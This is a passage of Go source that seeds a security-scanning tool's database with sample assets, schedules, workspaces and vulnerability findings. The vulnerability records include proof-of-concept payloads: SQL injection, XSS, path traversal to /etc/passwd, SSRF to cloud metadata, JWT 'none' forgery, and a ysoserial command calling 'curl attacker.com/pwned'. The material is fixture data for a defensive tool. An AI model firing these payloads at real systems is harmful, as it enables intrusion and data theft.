			Technologies:  []string{"Redis Commander", "Node.js"},
			ResponseTime:  "23ms",
			Source:        "httpx",
			CreatedAt:     oneHourAgo,
			UpdatedAt:     oneHourAgo,
		},
		{
			Workspace:     "test.local",
			AssetValue:    "minio.test.local",
			URL:           "http://minio.test.local:9000/",
			Scheme:        "http",
			Method:        "GET",
			Path:          "/",
			StatusCode:    403,
			ContentType:   "application/xml",
			ContentLength: 234,
			Title:         "",
			HostIP:        "192.168.1.13",
			DnsRecords:    []string{"192.168.1.13"},
			Technologies:  []string{"MinIO", "Go"},
			ResponseTime:  "34ms",
			Labels:        "Object storage - access denied",
			Source:        "httpx",
			CreatedAt:     oneHourAgo,
			UpdatedAt:     oneHourAgo,
		},
		{
			Workspace:     "test.local",
			AssetValue:    "rabbit.test.local",
			URL:           "http://rabbit.test.local:15672/",
			Scheme:        "http",
			Method:        "GET",
			Path:          "/",
			StatusCode:    200,
			ContentType:   "text/html",
			ContentLength: 7890,
			Title:         "RabbitMQ Management",
			Words:         345,
			Lines:         123,
			HostIP:        "192.168.1.14",
			DnsRecords:    []string{"192.168.1.14"},
			Technologies:  []string{"RabbitMQ", "Erlang"},
			ResponseTime:  "67ms",
			Source:        "httpx",
			CreatedAt:     oneHourAgo,
			UpdatedAt:     oneHourAgo,
		},
	}

	for _, asset := range assets {
		if _, err := db.NewInsert().Model(&asset).Exec(ctx); err != nil {
			return fmt.Errorf("failed to insert asset: %w", err)
		}
	}

	// Seed EventLogs
	eventLogs := []EventLog{
		{
			Topic:        TopicRunStarted,
			EventID:      uuid.New().String(),
			Name:         "subdomain-enum started",
			Source:       "executor",
			DataType:     "scan",
			Data:         fmt.Sprintf(`{"scan_id":"%s","target":"example.com"}`, scan1ID),
			Workspace:    "example.com",
			RunID:        scan1ID,
			WorkflowName: "subdomain-enum",
			Processed:    true,
			ProcessedAt:  &twoHoursAgo,
			CreatedAt:    twoHoursAgo,
		},
		{
			Topic:        TopicRunCompleted,
			EventID:      uuid.New().String(),
			Name:         "subdomain-enum completed",
			Source:       "executor",
			DataType:     "scan",
			Data:         fmt.Sprintf(`{"scan_id":"%s","target":"example.com","duration_ms":3600000}`, scan1ID),
			Workspace:    "example.com",
			RunID:        scan1ID,
			WorkflowName: "subdomain-enum",
			Processed:    true,
			ProcessedAt:  &oneHourAgo,
			CreatedAt:    oneHourAgo,
		},
		{
			Topic:        TopicAssetDiscovered,
			EventID:      uuid.New().String(),
			Name:         "New assets discovered",
			Source:       "httpx-step",
			DataType:     "asset",
			Data:         `{"count":78,"workspace":"example.com"}`,
			Workspace:    "example.com",
			RunID:        scan1ID,
			WorkflowName: "subdomain-enum",
			Processed:    true,
			ProcessedAt:  &oneHourAgo,
			CreatedAt:    oneHourAgo,
		},
		{
			Topic:        TopicRunStarted,
			EventID:      uuid.New().String(),
			Name:         "port-scan started",
			Source:       "scheduler",
			DataType:     "scan",
			Data:         fmt.Sprintf(`{"scan_id":"%s","target":"api.example.com","trigger":"daily-recon"}`, scan2ID),
			Workspace:    "api.example.com",
			RunID:        scan2ID,
			WorkflowName: "port-scan",
			Processed:    true,
			ProcessedAt:  &thirtyMinsAgo,
			CreatedAt:    thirtyMinsAgo,
		},
		{
			Topic:        TopicRunFailed,
			EventID:      uuid.New().String(),
			Name:         "vuln-scan failed",
			Source:       "executor",
			DataType:     "scan",
			Data:         fmt.Sprintf(`{"scan_id":"%s","target":"staging.test.local","error":"nuclei template loading failed"}`, scan3ID),
			Workspace:    "staging.test.local",
			RunID:        scan3ID,
			WorkflowName: "vuln-scan",
			Processed:    true,
			ProcessedAt:  &oneHourAgo,
			CreatedAt:    oneHourAgo,
		},
		{
			Topic:     TopicScheduleTriggered,
			EventID:   uuid.New().String(),
			Name:      "daily-recon triggered",
			Source:    "scheduler",
			DataType:  "schedule",
			Data:      `{"schedule_id":"sched-daily-recon","trigger_type":"cron","cron":"0 2 * * *"}`,
			Processed: true,
			CreatedAt: thirtyMinsAgo,
		},
	}

	for _, event := range eventLogs {
		if _, err := db.NewInsert().Model(&event).Exec(ctx); err != nil {
			return fmt.Errorf("failed to insert event log: %w", err)
		}
	}

	// Seed Schedules
	tomorrow := now.Add(24 * time.Hour)
	nextWeek := now.Add(7 * 24 * time.Hour)
	schedules := []Schedule{
		{
			ID:           "sched-daily-recon",
			Name:         "Daily Reconnaissance",
			WorkflowName: "subdomain-enum",
			WorkflowPath: "workflows/modules/subdomain-enum.yaml",
			TriggerName:  "daily-recon",
			TriggerType:  "cron",
			Schedule:     "0 2 * * *",
			InputConfig:  map[string]interface{}{"target": "example.com", "threads": 10},
			IsEnabled:    true,
			LastRun:      &twoHoursAgo,
			NextRun:      &tomorrow,
			RunCount:     45,
			CreatedAt:    now.Add(-45 * 24 * time.Hour),
			UpdatedAt:    now,
		},
		{
			ID:           "sched-weekly-vuln",
			Name:         "Weekly Vulnerability Scan",
			WorkflowName: "vuln-scan",
			WorkflowPath: "workflows/flows/vuln-scan.yaml",
			TriggerName:  "weekly-vuln",
			TriggerType:  "cron",
			Schedule:     "0 0 * * 0",
			InputConfig:  map[string]interface{}{"severity": "critical,high", "templates": "cves,default"},
			IsEnabled:    true,
			LastRun:      timePtr(now.Add(-3 * 24 * time.Hour)),
			NextRun:      &nextWeek,
			RunCount:     12,
			CreatedAt:    now.Add(-84 * 24 * time.Hour),
			UpdatedAt:    now.Add(-3 * 24 * time.Hour),
		},
		{
			ID:           "sched-hourly-monitor",
			Name:         "Hourly Asset Monitor",
			WorkflowName: "content-discovery",
			WorkflowPath: "workflows/modules/content-discovery.yaml",
			TriggerName:  "hourly-monitor",
			TriggerType:  "cron",
			Schedule:     "0 * * * *",
			InputConfig:  map[string]interface{}{"wordlist": "quick.txt", "threads": 20},
			IsEnabled:    true,
			LastRun:      &oneHourAgo,
			NextRun:      timePtr(now.Add(1 * time.Hour)),
			RunCount:     720,
			CreatedAt:    now.Add(-30 * 24 * time.Hour),
			UpdatedAt:    oneHourAgo,
		},
		{
			ID:           "sched-monthly-full",
			Name:         "Monthly Full Reconnaissance",
			WorkflowName: "full-recon",
			WorkflowPath: "workflows/flows/full-recon.yaml",
			TriggerName:  "monthly-full",
			TriggerType:  "cron",
			Schedule:     "0 0 1 * *",
			InputConfig:  map[string]interface{}{"threads": 30, "timeout": 3600, "include_screenshots": true},
			IsEnabled:    true,
			LastRun:      timePtr(now.Add(-15 * 24 * time.Hour)),
			NextRun:      timePtr(now.Add(15 * 24 * time.Hour)),
			RunCount:     6,
			CreatedAt:    now.Add(-180 * 24 * time.Hour),
			UpdatedAt:    now.Add(-15 * 24 * time.Hour),
		},
		{
			ID:           "sched-event-new-asset",
			Name:         "New Asset Discovery Trigger",
			WorkflowName: "port-scan",
			WorkflowPath: "workflows/modules/port-scan.yaml",
			TriggerName:  "new-asset-trigger",
			TriggerType:  "event",
			EventTopic:   "asset.discovered",
			InputConfig:  map[string]interface{}{"ports": "1-10000", "rate": 500},
			IsEnabled:    true,
			LastRun:      &thirtyMinsAgo,
			RunCount:     89,
			CreatedAt:    now.Add(-60 * 24 * time.Hour),
			UpdatedAt:    thirtyMinsAgo,
		},
		{
			ID:           "sched-disabled-legacy",
			Name:         "Legacy Scan (Disabled)",
			WorkflowName: "subdomain-enum",
			WorkflowPath: "workflows/modules/subdomain-enum.yaml",
			TriggerName:  "legacy-scan",
			TriggerType:  "cron",
			Schedule:     "0 3 * * *",
			InputConfig:  map[string]interface{}{"threads": 5},
			IsEnabled:    false,
			LastRun:      timePtr(now.Add(-30 * 24 * time.Hour)),
			RunCount:     120,
			CreatedAt:    now.Add(-150 * 24 * time.Hour),
			UpdatedAt:    now.Add(-30 * 24 * time.Hour),
		},
	}

	for _, schedule := range schedules {
		if _, err := db.NewInsert().Model(&schedule).Exec(ctx); err != nil {
			return fmt.Errorf("failed to insert schedule: %w", err)
		}
	}

	// Seed WorkflowMeta
	workflowMetas := []WorkflowMeta{
		{
			Name:        "subdomain-enum",
			Kind:        "module",
			Description: "Enumerate subdomains using multiple sources including subfinder, amass, and assetfinder",
			FilePath:    "workflows/modules/subdomain-enum.yaml",
			Checksum:    "a1b2c3d4e5f6789012345678901234567890abcd",
			Tags:        []string{"recon", "subdomain", "enumeration"},
			StepCount:   5,
			ModuleCount: 0,
			ParamsJSON:  `{"threads": 10, "timeout": 300, "resolvers": "resolvers.txt"}`,
			IndexedAt:   now,
			CreatedAt:   now.Add(-30 * 24 * time.Hour),
			UpdatedAt:   now,
		},
		{
			Name:        "port-scan",
			Kind:        "module",
			Description: "Comprehensive port scanning with masscan and nmap service detection",
			FilePath:    "workflows/modules/port-scan.yaml",
			Checksum:    "b2c3d4e5f67890123456789012345678abcdef01",
			Tags:        []string{"recon", "ports", "services"},
			StepCount:   4,
			ModuleCount: 0,
			ParamsJSON:  `{"ports": "1-65535", "rate": 1000, "top_ports": 1000}`,
			IndexedAt:   now,
			CreatedAt:   now.Add(-25 * 24 * time.Hour),
			UpdatedAt:   now,
		},
		{
			Name:        "vuln-scan",
			Kind:        "flow",
			Description: "Comprehensive vulnerability scanning flow using nuclei with multiple template categories",
			FilePath:    "workflows/flows/vuln-scan.yaml",
			Checksum:    "c3d4e5f6789012345678901234567890bcdef012",
			Tags:        []string{"vulnerability", "nuclei", "cve"},
			StepCount:   0,
			ModuleCount: 3,
			ParamsJSON:  `{"severity": "critical,high,medium", "templates": "cves,default,exposures"}`,
			IndexedAt:   now,
			CreatedAt:   now.Add(-20 * 24 * time.Hour),
			UpdatedAt:   now,
		},
		{
			Name:        "full-recon",
			Kind:        "flow",
			Description: "Complete reconnaissance flow including subdomain enumeration, port scanning, and content discovery",
			FilePath:    "workflows/flows/full-recon.yaml",
			Checksum:    "d4e5f67890123456789012345678901cdef0123",
			Tags:        []string{"recon", "comprehensive", "automation"},
			StepCount:   0,
			ModuleCount: 5,
			ParamsJSON:  `{"threads": 20, "timeout": 600, "include_screenshots": true}`,
			IndexedAt:   now,
			CreatedAt:   now.Add(-15 * 24 * time.Hour),
			UpdatedAt:   now,
		},
		{
			Name:        "content-discovery",
			Kind:        "module",
			Description: "Web content and directory discovery using ffuf and dirsearch",
			FilePath:    "workflows/modules/content-discovery.yaml",
			Checksum:    "e5f678901234567890123456789012def01234",
			Tags:        []string{"recon", "fuzzing", "directories"},
			StepCount:   3,
			ModuleCount: 0,
			ParamsJSON:  `{"wordlist": "common.txt", "threads": 50, "extensions": "php,html,js"}`,
			IndexedAt:   now,
			CreatedAt:   now.Add(-10 * 24 * time.Hour),
			UpdatedAt:   now,
		},
		{
			Name:        "screenshot-capture",
			Kind:        "module",
			Description: "Capture screenshots of web applications using gowitness",
			FilePath:    "workflows/modules/screenshot-capture.yaml",
			Checksum:    "f6789012345678901234567890123ef012345",
			Tags:        []string{"recon", "visual", "screenshots"},
			StepCount:   2,
			ModuleCount: 0,
			ParamsJSON:  `{"resolution": "1920x1080", "timeout": 30, "delay": 2}`,
			IndexedAt:   now,
			CreatedAt:   now.Add(-5 * 24 * time.Hour),
			UpdatedAt:   now,
		},
	}

	for _, wm := range workflowMetas {
		if _, err := db.NewInsert().Model(&wm).Exec(ctx); err != nil {
			return fmt.Errorf("failed to insert workflow meta: %w", err)
		}
	}

	// Seed Workspaces
	workspaceRecords := []Workspace{
		{
			Name:                "example.com",
			LocalPath:           "/home/osmedeus/workspaces-osmedeus/example.com",
			DataSource:          "local",
			TotalAssets:         78,
			TotalSubdomains:     112,
			TotalURLs:           245,
			TotalVulns:          15,
			VulnCritical:        2,
			VulnHigh:            5,
			VulnMedium:          4,
			VulnLow:             3,
			VulnPotential:       1,
			RiskScore:           7.5,
			Tags:                []string{"production", "priority"},
			LastRun:             &oneHourAgo,
			RunWorkflow:         "subdomain-enum",
			StateExecutionLog:   "/home/osmedeus/workspaces-osmedeus/example.com/run-execution.log",
			StateCompletedFile:  "/home/osmedeus/workspaces-osmedeus/example.com/run-completed.json",
			StateWorkflowFile:   "/home/osmedeus/workspaces-osmedeus/example.com/run-workflow.yaml",
			StateWorkflowFolder: "/home/osmedeus/workspaces-osmedeus/example.com/run-modules",
			CreatedAt:           now.Add(-30 * 24 * time.Hour),
			UpdatedAt:           oneHourAgo,
		},
		{
			Name:                "api.example.com",
			LocalPath:           "/home/osmedeus/workspaces-osmedeus/api.example.com",
			DataSource:          "cloud",
			TotalAssets:         23,
			TotalSubdomains:     5,
			TotalURLs:           45,
			TotalVulns:          3,
			VulnCritical:        0,
			VulnHigh:            1,
			VulnMedium:          2,
			VulnLow:             0,
			VulnPotential:       0,
			RiskScore:           4.2,
			Tags:                []string{"api", "internal"},
			LastRun:             &thirtyMinsAgo,
			RunWorkflow:         "port-scan",
			StateExecutionLog:   "/home/osmedeus/workspaces-osmedeus/api.example.com/run-execution.log",
			StateCompletedFile:  "/home/osmedeus/workspaces-osmedeus/api.example.com/run-completed.json",
			StateWorkflowFile:   "/home/osmedeus/workspaces-osmedeus/api.example.com/run-workflow.yaml",
			StateWorkflowFolder: "/home/osmedeus/workspaces-osmedeus/api.example.com/run-modules",
			CreatedAt:           now.Add(-15 * 24 * time.Hour),
			UpdatedAt:           thirtyMinsAgo,
		},
		{
			Name:                "staging.test.local",
			LocalPath:           "/home/osmedeus/workspaces-osmedeus/staging.test.local",
			DataSource:          "imported",
			TotalAssets:         15,
			TotalSubdomains:     8,
			TotalURLs:           30,
			TotalVulns:          0,
			VulnCritical:        0,
			VulnHigh:            0,
			VulnMedium:          0,
			VulnLow:             0,
			VulnPotential:       0,
			RiskScore:           0,
			Tags:                []string{"staging", "internal"},
			LastRun:             &twoHoursAgo,
			RunWorkflow:         "vuln-scan",
			StateExecutionLog:   "/home/osmedeus/workspaces-osmedeus/staging.test.local/run-execution.log",
			StateCompletedFile:  "/home/osmedeus/workspaces-osmedeus/staging.test.local/run-completed.json",
			StateWorkflowFile:   "/home/osmedeus/workspaces-osmedeus/staging.test.local/run-workflow.yaml",
			StateWorkflowFolder: "/home/osmedeus/workspaces-osmedeus/staging.test.local/run-modules",
			CreatedAt:           now.Add(-7 * 24 * time.Hour),
			UpdatedAt:           twoHoursAgo,
		},
	}

	for _, workspace := range workspaceRecords {
		if _, err := db.NewInsert().Model(&workspace).Exec(ctx); err != nil {
			return fmt.Errorf("failed to insert workspace: %w", err)
		}
	}

	// Seed Vulnerabilities
	vulnerabilities := []Vulnerability{
		{
			Workspace:          "example.com",
			VulnInfo:           "SQL Injection vulnerability in login endpoint",
			VulnTitle:          "SQL Injection - Authentication Bypass",
			VulnDesc:           "The login endpoint is vulnerable to SQL injection attacks through the username parameter, allowing authentication bypass.",
			VulnPOC:            "curl -X POST 'https://api.example.com/login' -d \"username=admin'--&password=x\"",
			Severity:           "critical",
			Confidence:         "certain",
			AssetType:          "endpoint",
			AssetValue:         "api.example.com",
			Tags:               []string{"sqli", "auth-bypass", "owasp-top10"},
			DetailHTTPRequest:  "POST /login HTTP/1.1\nHost: api.example.com\nContent-Type: application/x-www-form-urlencoded\n\nusername=admin'--&password=x",
			DetailHTTPResponse: "HTTP/1.1 200 OK\nContent-Type: application/json\n\n{\"status\":\"success\",\"token\":\"eyJ...\"}",
			RawVulnJSON:        `{"template":"sqli-auth-bypass","severity":"critical","host":"api.example.com"}`,
			CreatedAt:          oneHourAgo,
			UpdatedAt:          oneHourAgo,
		},
		{
			Workspace:          "example.com",
			VulnInfo:           "Cross-Site Scripting in search functionality",
			VulnTitle:          "Reflected XSS - Search Parameter",
			VulnDesc:           "The search functionality reflects user input without proper sanitization, allowing arbitrary JavaScript execution.",
			VulnPOC:            "https://blog.example.com/search?q=<script>alert(1)</script>",
			Severity:           "high",
			Confidence:         "firm",
			AssetType:          "endpoint",
			AssetValue:         "blog.example.com",
			Tags:               []string{"xss", "reflected", "owasp-top10"},
			DetailHTTPRequest:  "GET /search?q=<script>alert(1)</script> HTTP/1.1\nHost: blog.example.com",
			DetailHTTPResponse: "HTTP/1.1 200 OK\nContent-Type: text/html\n\n<h1>Search results for: <script>alert(1)</script></h1>",
			RawVulnJSON:        `{"template":"xss-reflected","severity":"high","host":"blog.example.com"}`,
			CreatedAt:          oneHourAgo,
			UpdatedAt:          oneHourAgo,
		},
		{
			Workspace:          "example.com",
			VulnInfo:           "Exposed sensitive configuration file",
			VulnTitle:          "Information Disclosure - Config File",
			VulnDesc:           "The .env configuration file is accessible publicly, exposing database credentials and API keys.",
			VulnPOC:            "curl https://dev.example.com/.env",
			Severity:           "high",
			Confidence:         "certain",
			AssetType:          "file",
			AssetValue:         "dev.example.com",
			Tags:               []string{"info-disclosure", "sensitive-data", "misconfiguration"},
			DetailHTTPRequest:  "GET /.env HTTP/1.1\nHost: dev.example.com",
			DetailHTTPResponse: "HTTP/1.1 200 OK\nContent-Type: text/plain\n\nDB_PASSWORD=secret123\nAPI_KEY=sk-live-xxx",
			RawVulnJSON:        `{"template":"exposed-env","severity":"high","host":"dev.example.com"}`,
			CreatedAt:          oneHourAgo,
			UpdatedAt:          oneHourAgo,
		},
		{
			Workspace:          "example.com",
			VulnInfo:           "Missing security headers",
			VulnTitle:          "Missing X-Frame-Options Header",
			VulnDesc:           "The application does not set X-Frame-Options header, making it vulnerable to clickjacking attacks.",
			VulnPOC:            "curl -I https://shop.example.com/",
			Severity:           "medium",
			Confidence:         "firm",
			AssetType:          "endpoint",
			AssetValue:         "shop.example.com",
			Tags:               []string{"headers", "clickjacking", "best-practices"},
			DetailHTTPRequest:  "HEAD / HTTP/1.1\nHost: shop.example.com",
			DetailHTTPResponse: "HTTP/1.1 200 OK\nContent-Type: text/html\n(no X-Frame-Options header)",
			RawVulnJSON:        `{"template":"missing-x-frame-options","severity":"medium","host":"shop.example.com"}`,
			CreatedAt:          oneHourAgo,
			UpdatedAt:          oneHourAgo,
		},
		{
			Workspace:          "example.com",
			VulnInfo:           "Outdated TLS version",
			VulnTitle:          "TLS 1.0 Enabled",
			VulnDesc:           "The server supports TLS 1.0 which has known vulnerabilities and should be disabled.",
			VulnPOC:            "nmap --script ssl-enum-ciphers -p 443 legacy.example.com",
			Severity:           "low",
			Confidence:         "certain",
			AssetType:          "service",
			AssetValue:         "legacy.example.com",
			Tags:               []string{"tls", "ssl", "deprecated"},
			DetailHTTPRequest:  "",
			DetailHTTPResponse: "",
			RawVulnJSON:        `{"template":"tls-version-check","severity":"low","host":"legacy.example.com","tls_versions":["TLSv1.0","TLSv1.2"]}`,
			CreatedAt:          oneHourAgo,
			UpdatedAt:          oneHourAgo,
		},
		// Additional vulnerabilities
		{
			Workspace:          "example.com",
			VulnInfo:           "Server-Side Request Forgery in webhook endpoint",
			VulnTitle:          "SSRF - Internal Network Access",
			VulnDesc:           "The webhook endpoint allows fetching arbitrary URLs, enabling access to internal services and cloud metadata.",
			VulnPOC:            "curl -X POST 'https://api.example.com/webhook' -d '{\"url\":\"http://169.254.169.254/latest/meta-data/\"}'",
			Severity:           "critical",
			Confidence:         "firm",
			AssetType:          "endpoint",
			AssetValue:         "api.example.com",
			Tags:               []string{"ssrf", "cloud", "metadata", "owasp-top10"},
			DetailHTTPRequest:  "POST /webhook HTTP/1.1\nHost: api.example.com\nContent-Type: application/json\n\n{\"url\":\"http://169.254.169.254/latest/meta-data/\"}",
			DetailHTTPResponse: "HTTP/1.1 200 OK\nContent-Type: application/json\n\n{\"data\":\"ami-id\\ninstance-id\\nlocal-hostname...\"}",
			RawVulnJSON:        `{"template":"ssrf-cloud-metadata","severity":"critical","host":"api.example.com","internal_access":true}`,
			CreatedAt:          oneHourAgo,
			UpdatedAt:          oneHourAgo,
		},
		{
			Workspace:          "example.com",
			VulnInfo:           "Path traversal in file download endpoint",
			VulnTitle:          "Directory Traversal - Arbitrary File Read",
			VulnDesc:           "The file download endpoint is vulnerable to path traversal, allowing reading of system files.",
			VulnPOC:            "curl 'https://files.example.com/download?file=../../../etc/passwd'",
			Severity:           "high",
			Confidence:         "certain",
			AssetType:          "endpoint",
			AssetValue:         "files.example.com",
			Tags:               []string{"lfi", "path-traversal", "file-read"},
			DetailHTTPRequest:  "GET /download?file=../../../etc/passwd HTTP/1.1\nHost: files.example.com",
			DetailHTTPResponse: "HTTP/1.1 200 OK\nContent-Type: text/plain\n\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:...",
			RawVulnJSON:        `{"template":"path-traversal","severity":"high","host":"files.example.com","file_accessed":"/etc/passwd"}`,
			CreatedAt:          oneHourAgo,
			UpdatedAt:          oneHourAgo,
		},
		{
			Workspace:          "example.com",
			VulnInfo:           "Insecure deserialization in session handling",
			VulnTitle:          "Java Deserialization RCE",
			VulnDesc:           "The application deserializes untrusted data in session cookies, allowing remote code execution.",
			VulnPOC:            "java -jar ysoserial.jar CommonsCollections5 'curl attacker.com/pwned' | base64",
			Severity:           "critical",
			Confidence:         "tentative",
			AssetType:          "endpoint",
			AssetValue:         "app.example.com",
			Tags:               []string{"deserialization", "rce", "java", "owasp-top10"},
			DetailHTTPRequest:  "GET /dashboard HTTP/1.1\nHost: app.example.com\nCookie: session=rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA...",
			DetailHTTPResponse: "HTTP/1.1 500 Internal Server Error\n\nException in thread \"main\" java.lang.Runtime...",
			RawVulnJSON:        `{"template":"java-deserialization","severity":"critical","host":"app.example.com","gadget":"CommonsCollections5"}`,
			CreatedAt:          oneHourAgo,
			UpdatedAt:          oneHourAgo,
		},
		{
			Workspace:          "example.com",
			VulnInfo:           "CORS misconfiguration allows credential theft",
			VulnTitle:          "CORS - Arbitrary Origin with Credentials",
			VulnDesc:           "The API reflects arbitrary origins in CORS headers and allows credentials, enabling cross-origin data theft.",
			VulnPOC:            "curl -H 'Origin: https://evil.com' https://api.example.com/user -I",
			Severity:           "medium",
			Confidence:         "firm",
			AssetType:          "endpoint",
			AssetValue:         "api.example.com",
			Tags:               []string{"cors", "misconfiguration", "credentials"},
			DetailHTTPRequest:  "GET /user HTTP/1.1\nHost: api.example.com\nOrigin: https://evil.com",
			DetailHTTPResponse: "HTTP/1.1 200 OK\nAccess-Control-Allow-Origin: https://evil.com\nAccess-Control-Allow-Credentials: true",
			RawVulnJSON:        `{"template":"cors-misconfiguration","severity":"medium","host":"api.example.com","reflected_origin":"evil.com"}`,
			CreatedAt:          oneHourAgo,
			UpdatedAt:          oneHourAgo,
		},
		{
			Workspace:          "example.com",
			VulnInfo:           "Open redirect in OAuth callback",
			VulnTitle:          "Open Redirect - OAuth Flow",
			VulnDesc:           "The OAuth callback endpoint does not validate the redirect_uri parameter, allowing phishing attacks.",
			VulnPOC:            "https://auth.example.com/oauth/callback?redirect_uri=https://evil.com/steal",
			Severity:           "medium",
			Confidence:         "tentative",
			AssetType:          "endpoint",
			AssetValue:         "auth.example.com",
			Tags:               []string{"open-redirect", "oauth", "phishing"},
			DetailHTTPRequest:  "GET /oauth/callback?redirect_uri=https://evil.com/steal HTTP/1.1\nHost: auth.example.com",
			DetailHTTPResponse: "HTTP/1.1 302 Found\nLocation: https://evil.com/steal?code=abc123",
			RawVulnJSON:        `{"template":"open-redirect","severity":"medium","host":"auth.example.com","redirect_to":"evil.com"}`,
			CreatedAt:          oneHourAgo,
			UpdatedAt:          oneHourAgo,
		},
		{
			Workspace:          "api.example.com",
			VulnInfo:           "GraphQL introspection enabled in production",
			VulnTitle:          "GraphQL Introspection Enabled",
			VulnDesc:           "GraphQL introspection is enabled, exposing the complete API schema including sensitive fields.",
			VulnPOC:            "curl -X POST 'https://api.example.com/graphql' -H 'Content-Type: application/json' -d '{\"query\":\"{__schema{types{name}}}\"}' ",
			Severity:           "low",
			Confidence:         "certain",
			AssetType:          "endpoint",
			AssetValue:         "api.example.com",
			Tags:               []string{"graphql", "introspection", "info-disclosure"},
			DetailHTTPRequest:  "POST /graphql HTTP/1.1\nHost: api.example.com\nContent-Type: application/json\n\n{\"query\":\"{__schema{types{name}}}\"}",
			DetailHTTPResponse: "HTTP/1.1 200 OK\nContent-Type: application/json\n\n{\"data\":{\"__schema\":{\"types\":[{\"name\":\"User\"},{\"name\":\"AdminSettings\"}...]}}}",
			RawVulnJSON:        `{"template":"graphql-introspection","severity":"low","host":"api.example.com","types_exposed":45}`,
			CreatedAt:          oneHourAgo,
			UpdatedAt:          oneHourAgo,
		},
		{
			Workspace:          "api.example.com",
			VulnInfo:           "JWT algorithm confusion vulnerability",
			VulnTitle:          "JWT None Algorithm Bypass",
			VulnDesc:           "The JWT validation accepts 'none' algorithm, allowing token forgery without signature verification.",
			VulnPOC:            "echo '{\"alg\":\"none\",\"typ\":\"JWT\"}' | base64 | tr -d '='",
			Severity:           "critical",
			Confidence:         "manual review required",
			AssetType:          "endpoint",
			AssetValue:         "api.example.com",
			Tags:               []string{"jwt", "authentication", "bypass"},
			DetailHTTPRequest:  "GET /api/admin HTTP/1.1\nHost: api.example.com\nAuthorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJyb2xlIjoiYWRtaW4ifQ.",
			DetailHTTPResponse: "HTTP/1.1 200 OK\nContent-Type: application/json\n\n{\"admin_data\":\"sensitive information\"}",
			RawVulnJSON:        `{"template":"jwt-none-algorithm","severity":"critical","host":"api.example.com","algorithm":"none"}`,
			CreatedAt:          twoHoursAgo,
			UpdatedAt:          twoHoursAgo,
		},
	}

	for _, vuln := range vulnerabilities {
		if _, err := db.NewInsert().Model(&vuln).Exec(ctx); err != nil {
			return fmt.Errorf("failed to insert vulnerability: %w", err)
		}
	}

	return nil
}

// CleanDatabase removes all data from all tables
func CleanDatabase(ctx context.Context) error {
	if db == nil {
		return fmt.Errorf("database not connected")
	}

	// Delete in order respecting foreign key constraints
	tables := []interface{}{
		(*StepResult)(nil),
		(*Artifact)(nil),
		(*EventLog)(nil),
		(*Run)(nil),
		(*Asset)(nil),
		(*Schedule)(nil),
		(*Workspace)(nil),
		(*Vulnerability)(nil),
		(*WorkflowMeta)(nil),
	}

	for _, table := range tables {
		if _, err := db.NewDelete().Model(table).Where("1=1").Exec(ctx); err != nil {
			return fmt.Errorf("failed to clean table: %w", err)
		}
	}

	return nil
}

// timePtr is a helper to create a pointer to a time.Time value
func timePtr(t time.Time) *time.Time {
	return &t
}

// TableInfo holds information about a database table
type TableInfo struct {
	Name     string
	RowCount int
}

// TableRecords holds paginated records from a table
type TableRecords struct {
	Table      string
	TotalCount int
	Offset     int
	Limit      int
	Records    interface{}
}

// ValidTableNames returns the list of valid table names
func ValidTableNames() []string {
	return []string{"runs", "step_results", "artifacts", "assets", "event_logs", "schedules", "workspaces", "vulnerabilities"}
}

// ListTables returns information about all database tables
func ListTables(ctx context.Context) ([]TableInfo, error) {
	if db == nil {
		return nil, fmt.Errorf("database not connected")
	}

	tables := []struct {
		name  string
		model interface{}
	}{
		{"runs", (*Run)(nil)},
		{"step_results", (*StepResult)(nil)},
		{"artifacts", (*Artifact)(nil)},
		{"assets", (*Asset)(nil)},
		{"event_logs", (*EventLog)(nil)},
		{"schedules", (*Schedule)(nil)},
		{"workspaces", (*Workspace)(nil)},
		{"vulnerabilities", (*Vulnerability)(nil)},
	}

	var result []TableInfo
	for _, t := range tables {
		count, err := db.NewSelect().Model(t.model).Count(ctx)
		if err != nil {
			// Table might not exist yet, return 0
			count = 0
		}
		result = append(result, TableInfo{
			Name:     t.name,
			RowCount: count,
		})
	}

	return result, nil
}

// tableSearchColumns defines which columns to search for each table
var tableSearchColumns = map[string][]string{
	"runs":            {"id", "run_id", "workflow_name", "target", "status", "error_message"},
	"step_results":    {"id", "run_id", "step_name", "step_type", "status", "command", "output", "error_message"},
	"artifacts":       {"id", "run_id", "name", "path", "type", "description"},
	"assets":          {"workspace", "asset_value", "url", "title", "host_ip", "source", "labels"},
	"event_logs":      {"event_id", "topic", "name", "source", "workspace", "run_id", "workflow_name", "data"},
	"schedules":       {"id", "name", "workflow_name", "trigger_name", "schedule"},
	"workspaces":      {"name", "local_path", "run_workflow"},
	"vulnerabilities": {"workspace", "vuln_title", "vuln_info", "severity", "asset_value", "asset_type"},
}

// tableDisplayColumns defines which columns to display by default for each table (ordered)
var tableDisplayColumns = map[string][]string{
	"runs":            {"run_id", "workflow_name", "target", "status", "started_at", "completed_at"},
	"step_results":    {"step_name", "step_type", "status", "duration_ms", "command"},
	"artifacts":       {"name", "path", "type", "size_bytes", "line_count"},
	"assets":          {"asset_value", "host_ip", "title", "status_code", "url"},
	"event_logs":      {"topic", "name", "source", "workspace", "created_at"},
	"schedules":       {"name", "workflow_name", "trigger_type", "schedule", "is_enabled"},
	"workspaces":      {"name", "total_assets", "total_vulns", "risk_score", "last_run"},
	"vulnerabilities": {"vuln_title", "severity", "asset_value", "workspace", "created_at"},
}

// tableAllColumns defines ALL columns for each table (ordered, matching model structs)
var tableAllColumns = map[string][]string{
	"runs": {"id", "run_id", "workflow_name", "workflow_kind", "target", "params",
		"status", "workspace_path", "started_at", "completed_at", "error_message",
		"schedule_id", "trigger_type", "trigger_name", "total_steps",
		"completed_steps", "created_at", "updated_at"},
	"step_results": {"id", "run_id", "step_name", "step_type", "status", "command",
		"output", "error_message", "exports", "duration_ms", "log_file",
		"started_at", "completed_at", "created_at"},
	"artifacts": {"id", "run_id", "name", "path", "type", "size_bytes",
		"line_count", "description", "created_at"},
	"assets": {"id", "workspace", "asset_value", "url", "input", "scheme", "method", "path",
		"status_code", "content_type", "content_length", "title", "words",
		"lines", "host_ip", "dns_records", "tls", "asset_type", "technologies",
		"response_time", "labels", "source", "created_at", "updated_at"},
	"event_logs": {"id", "topic", "event_id", "name", "source", "data_type", "data",
		"workspace", "run_id", "workflow_name", "processed", "processed_at",
		"error", "created_at"},
	"schedules": {"id", "name", "workflow_name", "workflow_path", "trigger_name",
		"trigger_type", "schedule", "event_topic", "watch_path",
